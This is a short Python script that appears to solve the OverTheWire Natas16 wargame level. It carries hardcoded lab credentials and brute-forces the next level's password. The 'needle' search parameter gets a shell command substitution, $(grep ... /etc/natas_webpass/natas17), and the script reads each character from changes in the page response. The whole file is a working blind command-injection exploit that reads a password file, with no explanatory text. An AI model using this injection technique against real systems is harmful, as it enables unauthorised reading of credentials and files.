import requests
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password=''
lengtpass=32
URL="http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/"
submit='Search'
while len(password) < 32:
	for p in characters:	
		r = requests.get(URL+'?needle=Africans$(grep ^'+password+p+' /etc/natas_webpass/natas17)&submit=Search').text
		if 'Africans' not in r:
			print p + "-length pass: " + str(len(password))
			password+=p
			
print password
